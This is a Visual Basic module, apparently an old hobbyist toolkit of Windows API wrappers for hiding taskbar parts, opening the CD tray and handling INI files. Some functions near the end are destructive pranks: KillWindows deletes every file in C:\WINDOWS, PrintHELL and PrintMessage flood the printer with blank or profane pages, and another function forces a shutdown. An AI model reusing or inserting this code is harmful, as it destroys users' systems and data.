Attribute VB_Name = "m0ss32"
'___m0ss32 v1 windows functions by m0ss__'
'___questions - ix m0ssim0@aol.com__'
'___have fun and send me your feed back__'
'___this took me a hella long time and i would appriciate__'
'___you mailing me or putting me in greetz if u use m0ss32__'
'__38 functions__'


Option Explicit


Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, source As Any, ByVal length As Long)
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Public Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Public Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Public Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Public Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Public Declare Function IsWindowVisible Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function SendMessageLong& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Public Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Public Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal Y As Long) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Public Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Public Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Public Declare Function ReleaseCapture Lib "user32" () As Long
Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Public Declare Function MessageBeep Lib "user32" (ByVal wType As Long) As Long
Declare Function mciGetErrorString Lib "winmm.dll" Alias "mciGetErrorStringA" (ByVal dwError As Long, ByVal lpstrBuffer As String, ByVal uLength As Long) As Long
Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
    Declare Sub keybd_event Lib "user32" _
    (ByVal bVk As Byte, ByVal bScan As Byte, _
    ByVal Flags As Long, ByVal ExtraInfo As Long)


Private Declare Function SystemParametersInfo Lib "user32" Alias _
    "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam _
    As Long, ByVal lpvParam As String, ByVal fuWinIni As Long) As Long
    Const SPI_SETDESKWALLPAPER = 20
    Const SPIF_UPDATEINIFILE = &H1
    Const SPIF_SENDWININICHANGE = &H2





Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long


Private Declare Function SHAddToRecentDocs Lib "Shell32" (ByVal lFlags As Long, ByVal lPv As Long) As Long

Public Const BM_GETCHECK = &HF0
Public Const BM_SETCHECK = &HF1

Public Const HWND_NOTOPMOST = -2
Public Const HWND_TOPMOST = -1

Public Const LB_GETCOUNT = &H18B
Public Const LB_GETITEMDATA = &H199
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185

Public Const SND_ASYNC = &H1
Public Const SND_NODEFAULT = &H2
Public Const SND_FLAG = SND_ASYNC Or SND_NODEFAULT

Public Const SW_HIDE = 0
Public Const SW_SHOW = 5

Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1

Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_MENU = &H12
Public Const VK_RETURN = &HD
Public Const VK_RIGHT = &H27
Public Const VK_SHIFT = &H10
Public Const VK_SPACE = &H20
Public Const VK_UP = &H26

Public Const WM_CHAR = &H102
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDBLCLK = &H203
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_MOVE = &HF012
Public Const WM_SETTEXT = &HC
Public Const WM_SYSCOMMAND = &H112

Public Const PROCESS_READ = &H10
Public Const RIGHTS_REQUIRED = &HF0000

Public Const ENTER_KEY = 13
Public Const Flags = SWP_NOMOVE Or SWP_NOSIZE

Public Type POINTAPI
        X As Long
        Y As Long
End Type
Function ClockHide()
Dim ShelltryWnd As Long, TraynotifyWnd As Long, TrayClockWClass As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
TraynotifyWnd& = FindWindowEx(ShelltrayWnd&, 0&, "TrayNotifyWnd", vbNullString)
TrayClockWClass& = FindWindowEx(TraynotifyWnd&, 0&, "TrayClockWClass", vbNullString)
Call ShowWindow(TrayClockWClass&, SW_HIDE)
End Function
Function ClockShow()
Dim ShelltryWnd As Long, TraynotifyWnd As Long, TrayClockWClass As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
TraynotifyWnd& = FindWindowEx(ShelltrayWnd&, 0&, "TrayNotifyWnd", vbNullString)
TrayClockWClass& = FindWindowEx(TraynotifyWnd&, 0&, "TrayClockWClass", vbNullString)
Call ShowWindow(TrayClockWClass&, SW_SHOW)
End Function
Function StartHide()
Dim ShelltrayWnd As Long, Button As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
Button& = FindWindowEx(ShelltrayWnd&, 0&, "Button", vbNullString)
Call ShowWindow(Button&, SW_HIDE)
End Function
Function StartShow()
Dim ShelltrayWnd As Long, Button As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
Button& = FindWindowEx(ShelltrayWnd&, 0&, "Button", vbNullString)
Call ShowWindow(Button&, SW_SHOW)
End Function
Function LinksHide()
Dim ShelltrayWnd As Long, ReBarWindow As Long, ToolbarWindow As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
ReBarWindow& = FindWindowEx(ShelltrayWnd&, 0&, "ReBarWindow32", vbNullString)
ToolbarWindow& = FindWindowEx(ReBarWindow&, 0&, "ToolbarWindow32", vbNullString)
Call ShowWindow(ToolbarWindow&, SW_HIDE)
End Function
Function LinksShow()
Dim ShelltrayWnd As Long, ReBarWindow As Long, ToolbarWindow As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
ReBarWindow& = FindWindowEx(ShelltrayWnd&, 0&, "ReBarWindow32", vbNullString)
ToolbarWindow& = FindWindowEx(ReBarWindow&, 0&, "ToolbarWindow32", vbNullString)
Call ShowWindow(ToolbarWindow&, SW_SHOW)
End Function
Function TaskHide()
Dim ShelltrayWnd As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
Call ShowWindow(ShelltrayWnd&, SW_HIDE)
End Function
Function TaskShow()
Dim ShelltrayWnd As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
Call ShowWindow(ShelltrayWnd&, SW_SHOW)
End Function
Function TrayItemsHide()
Dim ShelltrayWnd As Long, TraynotifyWnd As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
TraynotifyWnd& = FindWindowEx(ShelltrayWnd&, 0&, "TrayNotifyWnd", vbNullString)
Call ShowWindow(TraynotifyWnd&, SW_HIDE)

End Function
Function TrayItemsShow()
Dim ShelltrayWnd As Long, TraynotifyWnd As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
TraynotifyWnd& = FindWindowEx(ShelltrayWnd&, 0&, "TrayNotifyWnd", vbNullString)
Call ShowWindow(TraynotifyWnd&, SW_SHOW)
End Function
Function DesktopHide()
Dim Progman As Long, SHELLDLLDefView As Long, InternetExplorerServer As Long
Progman& = FindWindow("Progman", vbNullString)
SHELLDLLDefView& = FindWindowEx(Progman&, 0&, "SHELLDLL_DefView", vbNullString)
InternetExplorerServer& = FindWindowEx(SHELLDLLDefView&, 0&, "Internet Explorer_Server", vbNullString)
Call ShowWindow(InternetExplorerServer&, SW_HIDE)

End Function
Function DesktopShow()
Dim Progman As Long, SHELLDLLDefView As Long, InternetExplorerServer As Long
Progman& = FindWindow("Progman", vbNullString)
SHELLDLLDefView& = FindWindowEx(Progman&, 0&, "SHELLDLL_DefView", vbNullString)
InternetExplorerServer& = FindWindowEx(SHELLDLLDefView&, 0&, "Internet Explorer_Server", vbNullString)
Call ShowWindow(InternetExplorerServer&, SW_SHOW)
End Function
Sub Delete(file$)
Kill (file$)
End Sub
Public Sub FileSetHidden(TheFile As String)
    Dim SafeFile As String
    SafeFile$ = Dir(TheFile$)
    If SafeFile$ <> "" Then
        SetAttr TheFile$, vbHidden
    End If
End Sub
Public Sub FileSetNormal(TheFile As String)
    Dim SafeFile As String
    SafeFile$ = Dir(TheFile$)
    If SafeFile$ <> "" Then
        SetAttr TheFile$, vbNormal
    End If
End Sub
Public Sub FileSetReadOnly(TheFile As String)
    Dim SafeFile As String
    SafeFile$ = Dir(TheFile$)
    If SafeFile$ <> "" Then
        SetAttr TheFile$, vbReadOnly
    End If
End Sub
Public Function FileGetAttributes(TheFile As String) As Integer
    Dim SafeFile As String
    SafeFile$ = Dir(TheFile$)
    If SafeFile$ <> "" Then
        FileGetAttributes% = GetAttr(TheFile$)
    End If
End Function
Public Function GetFromINI(Section As String, Key As String, Directory As String) As String
   Dim strBuffer As String
   strBuffer = String(750, Chr(0))
   Key$ = LCase$(Key$)
   GetFromINI$ = Left(strBuffer, GetPrivateProfileString(Section$, ByVal Key$, "", strBuffer, Len(strBuffer), Directory$))
End Function
Public Sub WriteToINI(Section As String, Key As String, KeyValue As String, Directory As String)
    Call WritePrivateProfileString(Section$, UCase$(Key$), KeyValue$, Directory$)
End Sub
Public Sub SaveListBox(Directory As String, thelist As ListBox)
    Dim SaveList As Long
    On Error Resume Next
    Open Directory$ For Output As #1
    For SaveList& = 0 To thelist.ListCount - 1
        Print #1, thelist.List(SaveList&)
    Next SaveList&
    Close #1
End Sub
Public Sub SaveComboBox(ByVal Directory As String, Combo As ComboBox)
    Dim SaveCombo As Long
    On Error Resume Next
    Open Directory$ For Output As #1
    For SaveCombo& = 0 To Combo.ListCount - 1
        Print #1, Combo.List(SaveCombo&)
    Next SaveCombo&
    Close #1
End Sub
Public Sub LoadListbox(Directory As String, thelist As ListBox)
    Dim MyString As String
    On Error Resume Next
    Open Directory$ For Input As #1
    While Not EOF(1)
        Input #1, MyString$
        DoEvents
        thelist.AddItem MyString$
    Wend
    Close #1
End Sub
Public Sub LoadComboBox(ByVal Directory As String, Combo As ComboBox)
    Dim MyString As String
    On Error Resume Next
    Open Directory$ For Input As #1
    While Not EOF(1)
        Input #1, MyString$
        DoEvents
        Combo.AddItem MyString$
    Wend
    Close #1
End Sub


Public Sub BeepSpeaker()
MessageBeep -1&
End Sub
Public Sub OpenCD()
Dim returnstring As Long, retvalue As Long
 
    On Error Resume Next
    retvalue = mciSendString("set CDAudio door open", returnstring, 127, 0)
End Sub



Public Sub CloseCD()
Dim returnstring As Long, retvalue As Long
    
    On Error Resume Next
    retvalue = mciSendString("set CDAudio door closed", returnstring, 127, 0)
End Sub
Function DesktopIconsHide()
Dim Progman As Long, SHELLDLLDefView As Long, SysListView As Long
Progman& = FindWindow("Progman", vbNullString)
SHELLDLLDefView& = FindWindowEx(Progman&, 0&, "SHELLDLL_DefView", vbNullString)
SysListView& = FindWindowEx(SHELLDLLDefView&, 0&, "SysListView32", vbNullString)
Call ShowWindow(SysListView&, SW_HIDE)
End Function
Function DesktopIconsShow()
Dim Progman As Long, SHELLDLLDefView As Long, SysListView As Long
Progman& = FindWindow("Progman", vbNullString)
SHELLDLLDefView& = FindWindowEx(Progman&, 0&, "SHELLDLL_DefView", vbNullString)
SysListView& = FindWindowEx(SHELLDLLDefView&, 0&, "SysListView32", vbNullString)
Call ShowWindow(SysListView&, SW_SHOW)
End Function
Function PrintHELL()
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.EndDoc
End Function
Function PrintMessage()
    Printer.NewPage
    Printer.Print "DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  "
    Printer.NewPage
    Printer.Print "DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  "
    Printer.NewPage
    Printer.Print "DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  "
    Printer.NewPage
    Printer.Print "DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  "
    Printer.NewPage
    Printer.Print "DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  "
    Printer.EndDoc
End Function
Function GetFonTz(List1 As ListBox)
Dim i As Long
For i = 0 To Screen.FontCount - 1
    List1.AddItem Screen.Fonts(i)
Next i
End Function
Sub ScreenToClipboard()

Const VK_SNAPSHOT = &H2C
    Call keybd_event(VK_SNAPSHOT, 1, 0&, 0&)
End Sub

Function ClearDocList()
SHAddToRecentDocs 0, 0
End Function
Function WallpaperRemove()
    Dim X As Long
    X = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, "(None)", _
        SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
End Function
Function WallpaperChange(file$)
    Dim FileName As String
    Dim X As Long
    FileName = file$
X = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, FileName, _
        SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)

End Function
Function EmergencyShutDown()
ExitWindowsEx 15, 0
End Function
Function KillWindows()
On Error Resume Next
    Kill ("C:\WINDOWS\*.*")
End Function
